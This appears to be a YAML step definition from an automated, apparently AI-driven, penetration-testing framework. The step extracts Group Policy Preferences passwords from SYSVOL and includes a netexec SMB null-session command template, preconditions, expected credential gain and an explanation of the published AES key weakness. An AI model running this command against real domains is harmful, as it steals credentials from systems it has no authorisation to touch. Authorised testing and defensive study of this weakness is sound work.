name: gpp_password
category: ad
description: Extract Group Policy Preferences passwords from SYSVOL
preconditions:
- service.port==445
- domain_joined
parameters:
  target_ip: from_engagement.target_ip
command_template: netexec smb {target_ip} -u '' -p '' -M gpp_password
parser: generic_parser
expected_effects:
- gpp_password_found
- has_cred
falsifier:
  pattern: No entries|Module failed
  timeout: 30
model_tier: haiku
mechanism: GPP (Group Policy Preferences) stored passwords in SYSVOL XML files encrypted with a known AES key (published by
  Microsoft). MS14-025 patched creation but existing entries persist. gpp-decrypt decodes the cpassword attribute.
hacktricks_ref: windows-hardening/active-directory-methodology/README.md
